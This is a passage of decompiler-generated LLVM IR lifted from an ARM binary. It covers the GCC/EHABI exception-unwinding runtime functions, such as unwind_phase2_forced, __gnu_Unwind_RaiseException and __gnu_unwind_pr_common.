  %v3_21b3c = inttoptr i32 %v2_21b3c to i32*
  store i32 %v2_21b38, i32* %v3_21b3c, align 4
  br label %dec_label_pc_2199c

dec_label_pc_21b44:                               ; preds = %dec_label_pc_21b20
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_21b4c = load i32, i32* %r5.global-to-local, align 4
  %v2_21b4c = add i32 %v0_21b4c, -39672
  %v2_21b50 = add i32 %v0_21ad4, 16
  %v3_21b50 = inttoptr i32 %v2_21b50 to i32*
  store i32 %v2_21b4c, i32* %v3_21b50, align 4
  br label %dec_label_pc_2199c

; uselistorder directives
  uselistorder i32 %v1_21b04, { 2, 1, 0 }
  uselistorder i32 %v0_21ad4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_21a84, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_21a54, { 1, 0 }
  uselistorder i32 %v3_21a0c, { 2, 1, 0 }
  uselistorder i32 %v3_21a08, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_21a00, { 1, 0 }
  uselistorder i32 %v0_21a00, { 1, 0 }
  uselistorder i32 %v2_219d4, { 1, 0 }
  uselistorder i32 %v0_21a10.pre, { 1, 0 }
  uselistorder i32 %v3_219c0, { 1, 0 }
  uselistorder i32 %v1_21974, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 11, 12, 13, 14 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_21ad4, { 1, 0 }
  uselistorder label %dec_label_pc_21a50, { 1, 0 }
  uselistorder label %dec_label_pc_21a00, { 1, 0 }
  uselistorder label %dec_label_pc_219e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2199c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_21b5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_21b5c:
  %v0_21b5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21b5c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_21b5c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_21b5c, %bb
  %v10_21b64 = phi i32 [ %arg1, %dec_label_pc_21b5c ], [ 0, %bb ]
  ret i32 %v10_21b64

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_21b78 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_21b8c = inttoptr i32 %v1_21b78 to i32*
  %v2_21b8c = load i32, i32* %v1_21b8c, align 4
  store i32 %v2_21b8c, i32* %r0.global-to-local, align 4
  %v12_21b8c = add i32 %entry_vrs, 20
  %v1_21b98 = inttoptr i32 %v12_21b8c to i32*
  %v2_21b98 = load i32, i32* %v1_21b98, align 4
  store i32 %v2_21b98, i32* %r0.global-to-local, align 4
  %v12_21b98 = add i32 %entry_vrs, 36
  %v1_21ba0 = inttoptr i32 %v12_21b98 to i32*
  %v2_21ba0 = load i32, i32* %v1_21ba0, align 4
  store i32 %v2_21ba0, i32* %r0.global-to-local, align 4
  %v12_21ba0 = add i32 %entry_vrs, 52
  store i32 %v12_21ba0, i32* @ip, align 4
  %v13_21ba4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_21ba4, i32* @lr, align 4
  %v1_21ba8 = inttoptr i32 %v12_21ba0 to i32*
  %v2_21ba8 = load i32, i32* %v1_21ba8, align 4
  store i32 %v2_21ba8, i32* %r0.global-to-local, align 4
  %v9_21ba8 = add i32 %entry_vrs, 64
  %v10_21ba8 = inttoptr i32 %v9_21ba8 to i32*
  %v11_21ba8 = load i32, i32* %v10_21ba8, align 4
  store i32 0, i32* @r4, align 4
  %v1_21bb0 = add i32 %ucbp, 12
  %v2_21bb0 = inttoptr i32 %v1_21bb0 to i32*
  %v3_21bb0 = load i32, i32* %v2_21bb0, align 4
  store i32 %v2_21ba8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_21bc8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_21ba8)
  store i32 %v2_21bc8, i32* %r0.global-to-local, align 4
  %v0_21bcc = load i32, i32* @r6, align 4
  %v1_21bcc = load i32, i32* @r4, align 4
  %v9_21bcc = icmp eq i32 %v0_21bcc, %v1_21bcc
  store i32 %v2_21bc8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_21bcc, label %dec_label_pc_21be0, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_21bec

dec_label_pc_21be0:                               ; preds = %entry
  store i32 %v0_21bcc, i32* @r4, align 4
  br label %dec_label_pc_21be8

dec_label_pc_21be8:                               ; preds = %dec_label_pc_21cb0, %dec_label_pc_21be0
  br label %dec_label_pc_21bec

dec_label_pc_21bec:                               ; preds = %.thread, %dec_label_pc_21be8
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_21be8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_21bec = icmp eq i32 %v2_21bc8, 0
  br i1 %v2_21bec, label %dec_label_pc_21c64, label %.thread2.dec_label_pc_21c00_crit_edge

.thread2.dec_label_pc_21c00_crit_edge:            ; preds = %dec_label_pc_21bec
  br label %dec_label_pc_21c00

dec_label_pc_21c00:                               ; preds = %.thread2.dec_label_pc_21c00_crit_edge, %dec_label_pc_21c64
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_21c10 = load i32, i32* @r5, align 4
  store i32 %v0_21c10, i32* @r3, align 4
  store i32 138272, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_21bb0)
  br i1 false, label %dec_label_pc_21c28, label %dec_label_pc_21c50

dec_label_pc_21c28:                               ; preds = %dec_label_pc_21c00
  br i1 undef, label %dec_label_pc_21c30, label %dec_label_pc_21c54

dec_label_pc_21c30:                               ; preds = %dec_label_pc_21c28
  br i1 undef, label %dec_label_pc_21cb0, label %dec_label_pc_21c48

dec_label_pc_21c48:                               ; preds = %dec_label_pc_21c30
  br i1 undef, label %dec_label_pc_21ca8, label %dec_label_pc_21c50

dec_label_pc_21c50:                               ; preds = %dec_label_pc_21c00, %dec_label_pc_21c48
  br label %dec_label_pc_21c54

dec_label_pc_21c54:                               ; preds = %dec_label_pc_21c28, %dec_label_pc_21c50
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_21c64:                               ; preds = %dec_label_pc_21bec
  store i32 %v11_21ba8, i32* @r3, align 4
  %v2_21c68 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_21c68, i32* @r4, align 4
  %v1_21c6c = load i32, i32* @r5, align 4
  %v2_21c6c = add i32 %v1_21c6c, 20
  %v3_21c6c = inttoptr i32 %v2_21c6c to i32*
  store i32 %v11_21ba8, i32* %v3_21c6c, align 4
  store i32 %v2_21c68, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_21c7c = call i32 @memcpy()
  %v0_21c84 = load i32, i32* @r6, align 4
  store i32 %v0_21c84, i32* %r0.global-to-local, align 4
  %v0_21c88 = load i32, i32* @r5, align 4
  %v1_21c8c = add i32 %v0_21c88, 16
  %v2_21c8c = inttoptr i32 %v1_21c8c to i32*
  %v3_21c8c = load i32, i32* %v2_21c8c, align 4
  store i32 %v3_21c8c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_21c8c)
  %v0_21c9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_21c9c, i32* @r4, align 4
  br label %dec_label_pc_21c00

dec_label_pc_21ca8:                               ; preds = %dec_label_pc_21c48
  br label %dec_label_pc_21cb0

dec_label_pc_21cb0:                               ; preds = %dec_label_pc_21c30, %dec_label_pc_21ca8
  br label %dec_label_pc_21be8

; uselistorder directives
  uselistorder i32 %v11_21ba8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 9, 11, 10, 1, 0, 5, 4, 8, 7, 3, 6, 2 }
  uselistorder i32* @r3, { 21, 22, 18, 19, 7, 79, 80, 10, 81, 82, 83, 84, 85, 86, 0, 87, 88, 89, 90, 8, 9, 11, 12, 13, 14, 15, 16, 17, 44, 45, 46, 91, 92, 93, 94, 103, 104, 105, 97, 98, 99, 100, 101, 1, 102, 3, 27, 28, 95, 96, 47, 48, 64, 68, 69, 29, 4, 5, 6, 109, 106, 107, 108, 2, 110, 111, 112, 20, 30, 31, 32, 33, 34, 35, 49, 70, 23, 24, 58, 59, 60, 61, 62, 63, 25, 26, 65, 36, 37, 38, 39, 40, 41, 42, 43, 50, 51, 52, 53, 54, 55, 56, 57, 66, 67, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32 10, { 1, 2, 18, 19, 20, 4, 24, 23, 39, 0, 25, 26, 37, 27, 38, 5, 6, 7, 21, 36, 8, 3, 22, 9, 10, 11, 12, 28, 29, 30, 31, 32, 33, 34, 35, 13, 15, 16, 14, 17 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_21cb0, { 1, 0 }
  uselistorder label %dec_label_pc_21c54, { 1, 0 }
  uselistorder label %dec_label_pc_21c50, { 1, 0 }
  uselistorder label %dec_label_pc_21c00, { 1, 0 }
  uselistorder label %dec_label_pc_21bec, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_21cc4 = add i32 %ucbp, 12
  %v3_21cc4 = inttoptr i32 %v2_21cc4 to i32*
  store i32 %stop_fn, i32* %v3_21cc4, align 4
  %v3_21cc8 = add i32 %ucbp, 24
  %v4_21cc8 = inttoptr i32 %v3_21cc8 to i32*
  store i32 %tmp, i32* %v4_21cc8, align 4
  %v1_21ccc = add i32 %entry_vrs, 60
  %v2_21ccc = inttoptr i32 %v1_21ccc to i32*
  %v3_21ccc = load i32, i32* %v2_21ccc, align 4
  %v2_21cd4 = add i32 %entry_vrs, 64
  %v3_21cd4 = inttoptr i32 %v2_21cd4 to i32*
  store i32 %v3_21ccc, i32* %v3_21cd4, align 4
  %v3_21cdc = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_21cdc

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_21cf46 = add i32 %vrs, 64
  %v2_21cf47 = inttoptr i32 %v1_21cf46 to i32*
  %v3_21cf48 = load i32, i32* %v2_21cf47, align 4
  %v2_21cf89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_21cf48)
  store i32 %v2_21cf89, i32* %r0.global-to-local, align 4
  %v2_21cfc11 = icmp eq i32 %v2_21cf89, 0
  br i1 %v2_21cfc11, label %dec_label_pc_21d04, label %dec_label_pc_21d34

dec_label_pc_21d04:                               ; preds = %entry, %dec_label_pc_21d04.dec_label_pc_21cf0_crit_edge
  %v0_21d04 = load i32, i32* @r5, align 4
  %v1_21d04 = add i32 %v0_21d04, 64
  %v2_21d04 = inttoptr i32 %v1_21d04 to i32*
  %v3_21d04 = load i32, i32* %v2_21d04, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_21d0c = load i32, i32* @r4, align 4
  %v2_21d0c = add i32 %v1_21d0c, 20
  %v3_21d0c = inttoptr i32 %v2_21d0c to i32*
  store i32 %v3_21d04, i32* %v3_21d0c, align 4
  %v0_21d10 = load i32, i32* @r4, align 4
  %v1_21d18 = add i32 %v0_21d10, 16
  %v2_21d18 = inttoptr i32 %v1_21d18 to i32*
  %v3_21d18 = load i32, i32* %v2_21d18, align 4
  call void @__pseudo_branch(i32 %v3_21d18)
  %v0_21d24 = load i32, i32* %r0.global-to-local, align 4
  %v7_21d24 = icmp eq i32 %v0_21d24, 8
  br i1 %v7_21d24, label %dec_label_pc_21d04.dec_label_pc_21cf0_crit_edge, label %dec_label_pc_21d2c

dec_label_pc_21d04.dec_label_pc_21cf0_crit_edge:  ; preds = %dec_label_pc_21d04
  %v0_21cf0.pre = load i32, i32* @r4, align 4
  %v0_21cf4.pre = load i32, i32* @r5, align 4
  store i32 %v0_21cf0.pre, i32* %r0.global-to-local, align 4
  %v1_21cf4 = add i32 %v0_21cf4.pre, 64
  %v2_21cf4 = inttoptr i32 %v1_21cf4 to i32*
  %v3_21cf4 = load i32, i32* %v2_21cf4, align 4
  %v2_21cf8 = call i32 @get_eit_entry(i32 %v0_21cf0.pre, i32 %v3_21cf4)
  store i32 %v2_21cf8, i32* %r0.global-to-local, align 4
  %v2_21cfc = icmp eq i32 %v2_21cf8, 0
  br i1 %v2_21cfc, label %dec_label_pc_21d04, label %dec_label_pc_21d34

dec_label_pc_21d2c:                               ; preds = %dec_label_pc_21d04
  %v7_21d2c = icmp eq i32 %v0_21d24, 7
  br i1 %v7_21d2c, label %dec_label_pc_21d38, label %dec_label_pc_21d34

dec_label_pc_21d34:                               ; preds = %entry, %dec_label_pc_21d04.dec_label_pc_21cf0_crit_edge, %dec_label_pc_21d2c
  %v0_21d34 = call i32 @abort()
  store i32 %v0_21d34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21d38

dec_label_pc_21d38:                               ; preds = %dec_label_pc_21d2c, %dec_label_pc_21d34
  %v0_21d38 = load i32, i32* @r5, align 4
  %v1_21d38 = add i32 %v0_21d38, 4
  store i32 %v1_21d38, i32* %r0.global-to-local, align 4
  %v1_21d3c = inttoptr i32 %v1_21d38 to i32*
  %v2_21d3c = call i32 @__restore_core_regs(i32* %v1_21d3c)
  store i32 %v2_21d3c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 1, 5, 7, 6, 3, 4, 9, 8, 0 }
  uselistorder label %dec_label_pc_21d38, { 1, 0 }
  uselistorder label %dec_label_pc_21d34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_21d04, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_21d40 = add i32 %ucbp, 20
  %v2_21d40 = inttoptr i32 %v1_21d40 to i32*
  %v3_21d40 = load i32, i32* %v2_21d40, align 4
  %v1_21d48 = load i32, i32* %r1.global-to-local, align 4
  %v2_21d48 = add i32 %v1_21d48, 64
  %v3_21d48 = inttoptr i32 %v2_21d48 to i32*
  store i32 %v3_21d40, i32* %v3_21d48, align 4
  %v1_21d4c = add i32 %ucbp, 12
  %v2_21d4c = inttoptr i32 %v1_21d4c to i32*
  %v3_21d4c = load i32, i32* %v2_21d4c, align 4
  %v2_21d50 = icmp eq i32 %v3_21d4c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_21d5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_21d5c, i32* @r5, align 4
  br i1 %v2_21d50, label %dec_label_pc_21d64, label %dec_label_pc_21da0

dec_label_pc_21d64:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_21d70 = add i32 %ucbp, 16
  %v2_21d70 = inttoptr i32 %v1_21d70 to i32*
  %v3_21d70 = load i32, i32* %v2_21d70, align 4
  call void @__pseudo_branch(i32 %v3_21d70)
  br i1 false, label %dec_label_pc_21d98, label %dec_label_pc_21d84

dec_label_pc_21d84:                               ; preds = %dec_label_pc_21d64
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_1c964.613 to i32))
  %v0_21d8c = load i32, i32* @r4, align 4
  %v0_21d90 = load i32, i32* @r5, align 4
  store i32 %v0_21d90, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_21d8c, i32 %v0_21d90)
  br label %dec_label_pc_21d98

dec_label_pc_21d98:                               ; preds = %dec_label_pc_21d64, %dec_label_pc_21d84
  %v0_21d98 = load i32, i32* @r5, align 4
  %v1_21d98 = add i32 %v0_21d98, 4
  %v1_21d9c = inttoptr i32 %v1_21d98 to i32*
  %v2_21d9c = call i32 @__restore_core_regs(i32* %v1_21d9c)
  %v1_21da4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_21da0

dec_label_pc_21da0:                               ; preds = %entry, %dec_label_pc_21d98
  %v1_21da4 = phi i32 [ %v0_21d5c, %entry ], [ %v1_21da4.pre, %dec_label_pc_21d98 ]
  %v3_21da4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_21da4, i32 1)
  %v0_21da8 = call i32 @abort()
  ret i32 %v0_21da8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 10, 9, 8, 7, 2, 1, 5, 4, 6, 3, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 25, 26, 27, 28, 37, 39, 21, 18, 19, 20, 14, 15, 16, 22, 23, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 29, 44, 48, 47, 46, 40, 41, 33, 34, 24, 30, 31, 32, 42, 43, 45, 35, 36, 38, 0, 1, 2, 3, 4 }
  uselistorder i1 true, { 0, 4, 5, 6, 66, 78, 7, 79, 80, 81, 82, 8, 56, 69, 83, 9, 55, 84, 10, 54, 85, 86, 87, 88, 11, 89, 70, 12, 58, 90, 13, 57, 91, 92, 14, 93, 94, 95, 15, 96, 97, 16, 98, 17, 72, 99, 100, 71, 101, 102, 18, 59, 19, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 21, 61, 22, 113, 114, 115, 23, 60, 116, 24, 20, 117, 118, 25, 119, 120, 121, 26, 122, 123, 124, 125, 126, 27, 28, 73, 29, 30, 31, 77, 62, 127, 128, 129, 68, 130, 67, 32, 63, 64, 131, 75, 132, 133, 34, 134, 135, 35, 65, 137, 33, 138, 136, 139, 74, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 76, 51, 52, 53, 1, 2, 3 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_21da0, { 1, 0 }
  uselistorder label %dec_label_pc_21d98, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_21dac = load i32, i32* @r4, align 4
  store i32 %v3_21dac, i32* %stack_var_-16, align 4
  %v6_21dac = load i32, i32* @r5, align 4
  %v9_21dac = load i32, i32* @r6, align 4
  %v12_21dac = load i32, i32* @lr, align 4
  %v1_21db0 = add i32 %entry_vrs, 60
  %v2_21db0 = inttoptr i32 %v1_21db0 to i32*
  %v3_21db0 = load i32, i32* %v2_21db0, align 4
  %v2_21db4 = add i32 %entry_vrs, 64
  %v3_21db4 = inttoptr i32 %v2_21db4 to i32*
  store i32 %v3_21db0, i32* %v3_21db4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_21de4 = load i32, i32* %v3_21db4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_21dfc = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_21de4)
  %v2_21e00 = icmp eq i32 %v2_21dfc, 0
  br i1 %v2_21e00, label %dec_label_pc_21e08, label %dec_label_pc_21e3c

dec_label_pc_21e08:                               ; preds = %entry
  %v0_21e08 = load i32, i32* @r5, align 4
  %v1_21e10 = add i32 %v0_21e08, 16
  %v2_21e10 = inttoptr i32 %v1_21e10 to i32*
  %v3_21e10 = load i32, i32* %v2_21e10, align 4
  call void @__pseudo_branch(i32 %v3_21e10)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_21e28 = load i32, i32* %saved_vrs_-320, align 4
  %v1_21e2c = urem i32 %v2_21e28, 2
  %v2_21e2c = icmp eq i32 %v1_21e2c, 0
  br i1 %v2_21e2c, label %dec_label_pc_21e4c, label %dec_label_pc_21e34

dec_label_pc_21e34:                               ; preds = %dec_label_pc_21e08, %dec_label_pc_21e4c
  %v0_21e34 = phi i1 [ false, %dec_label_pc_21e08 ], [ %phitmp, %dec_label_pc_21e4c ]
  br i1 %v0_21e34, label %dec_label_pc_21e58, label %dec_label_pc_21e3c

dec_label_pc_21e3c:                               ; preds = %entry, %dec_label_pc_21e34
  %v2_21e44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_21e44, i32* @r4, align 4
  store i32 %v6_21dac, i32* @r5, align 4
  store i32 %v9_21dac, i32* @r6, align 4
  store i32 %v12_21dac, i32* @lr, align 4
  ret i32 9

dec_label_pc_21e4c:                               ; preds = %dec_label_pc_21e08
  %v2_21e4c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_21e4c, i32* @r0, align 4
  %v1_21e50 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_21e4c)
  %v0_21e34.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_21e34.pre, 6
  br label %dec_label_pc_21e34

dec_label_pc_21e58:                               ; preds = %dec_label_pc_21e34
  %v0_21e58 = load i32, i32* @r5, align 4
  %v0_21e5c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_21e58, i32 %v0_21e5c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 6, 7, 5 }
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_21e3c, { 1, 0 }
  uselistorder label %dec_label_pc_21e34, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_21e64 = add i32 %ucbp, 12
  %v2_21e64 = inttoptr i32 %v1_21e64 to i32*
  %v3_21e64 = load i32, i32* %v2_21e64, align 4
  %v2_21e68 = icmp eq i32 %v3_21e64, 0
  br i1 %v2_21e68, label %dec_label_pc_21e70, label %dec_label_pc_21e74

dec_label_pc_21e70:                               ; preds = %entry
  %v2_21e70 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_21e74

dec_label_pc_21e74:                               ; preds = %entry, %dec_label_pc_21e70
  %v1_21e74 = add i32 %entry_vrs, 60
  %v2_21e74 = inttoptr i32 %v1_21e74 to i32*
  %v3_21e74 = load i32, i32* %v2_21e74, align 4
  %v2_21e7c = add i32 %entry_vrs, 64
  %v3_21e7c = inttoptr i32 %v2_21e7c to i32*
  store i32 %v3_21e74, i32* %v3_21e7c, align 4
  %v3_21e80 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_21e80

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_21e74, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_21ee0

bb:                                               ; preds = %entry
  %v7_21e98 = mul i32 %regclass, 4
  %v8_21e98 = add i32 %v7_21e98, ptrtoint (i32* @global_var_21ea0.767 to i32)
  call void @__pseudo_branch(i32 %v8_21e98)
  br label %dec_label_pc_21ee0

dec_label_pc_21ee0:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_9, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_21fc8 = load i32, i32* @r4, align 4
  %v6_21fc8 = load i32, i32* @r5, align 4
  %v2_21fd8 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_21fe0 = add i32 %ucbp, 76
  %v2_21fe0 = inttoptr i32 %v1_21fe0 to i32*
  %v3_21fe0 = load i32, i32* %v2_21fe0, align 4
  %v1_21fec = inttoptr i32 %v3_21fe0 to i32*
  %v2_21fec = load i32, i32* %v1_21fec, align 4
  store i32 %v2_21fec, i32* @lr, align 4
  %v4_21fec = add i32 %v3_21fe0, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_21ff8 = urem i32 %state, 4
  store i32 %v1_21ff8, i32* %r2.global-to-local, align 4
  %v1_21ffc = and i32 %state, 8
  store i32 %v1_21ffc, i32* %r0.global-to-local, align 4
  %v4_2200c = getelementptr inbounds %anon_struct_9, %anon_struct_9* %uws_-60, i32 0, i32 0
  store i32 %v2_21fec, i32* %v4_2200c, align 8
  br i1 %v2_21fd8, label %dec_label_pc_2201c, label %dec_label_pc_222f8

dec_label_pc_2201c:                               ; preds = %entry
  %v3_2201c = mul i32 %v2_21fec, 256
  store i32 %v3_2201c, i32* %v4_2200c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22034

dec_label_pc_22034:                               ; preds = %dec_label_pc_222f8, %dec_label_pc_2201c
  %v0_22058647090 = phi i32 [ %v2_22310, %dec_label_pc_222f8 ], [ %v4_21fec, %dec_label_pc_2201c ]
  store i32 %v1_21ff8, i32* %r2.global-to-local, align 4
  %v1_22038 = add i32 %ucbp, 80
  %v2_22038 = inttoptr i32 %v1_22038 to i32*
  %v3_22038 = load i32, i32* %v2_22038, align 4
  %v7_2203c = icmp eq i32 %v1_21ff8, 2
  br i1 %v7_2203c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_22034
  %v2_22040 = add i32 %ucbp, 56
  %v3_22040 = inttoptr i32 %v2_22040 to i32*
  %v4_22040 = load i32, i32* %v3_22040, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_22034, %bb
  %v0_220586470 = phi i32 [ %v0_22058647090, %dec_label_pc_22034 ], [ %v4_22040, %bb ]
  %v1_22044 = urem i32 %v3_22038, 2
  %v2_22044 = icmp eq i32 %v1_22044, 0
  br i1 %v2_22044, label %dec_label_pc_22058.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_22118

dec_label_pc_22058.preheader:                     ; preds = %bb148
  %v1_220586571 = inttoptr i32 %v0_220586470 to i32*
  %v2_220586672 = load i32, i32* %v1_220586571, align 4
  %v2_2205c6874 = icmp eq i32 %v2_220586672, 0
  br i1 %v2_2205c6874, label %dec_label_pc_22118, label %dec_label_pc_22064.preheader.lr.ph.lr.ph

dec_label_pc_22064.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_22058.preheader
  %v7_22068 = icmp eq i32 %id, 2
  %v2_220f4 = icmp eq i32 %v1_21ff8, 0
  %v2_222c0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_221dc = icmp eq i32 %v1_21ffc, 0
  br label %dec_label_pc_22064.preheader.lr.ph

dec_label_pc_22064.preheader.lr.ph:               ; preds = %dec_label_pc_22064.preheader.lr.ph.lr.ph, %dec_label_pc_2232c
  %v1_2207496 = phi i32 [ %v2_220586672, %dec_label_pc_22064.preheader.lr.ph.lr.ph ], [ %v2_2205866, %dec_label_pc_2232c ]
  %v1_2207093 = phi i32 [ %v0_220586470, %dec_label_pc_22064.preheader.lr.ph.lr.ph ], [ %v2_22330, %dec_label_pc_2232c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_22064.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_2232c ]
  br label %dec_label_pc_22064.preheader

dec_label_pc_22064.preheader:                     ; preds = %dec_label_pc_22064.preheader.lr.ph, %dec_label_pc_222f0
  %v1_2207495 = phi i32 [ %v1_2207496, %dec_label_pc_22064.preheader.lr.ph ], [ %v2_22058, %dec_label_pc_222f0 ]
  %v1_2207092 = phi i32 [ %v1_2207093, %dec_label_pc_22064.preheader.lr.ph ], [ %v1_222f0, %dec_label_pc_222f0 ]
  br label %dec_label_pc_22064

dec_label_pc_22064:                               ; preds = %dec_label_pc_22064.preheader, %dec_label_pc_22108
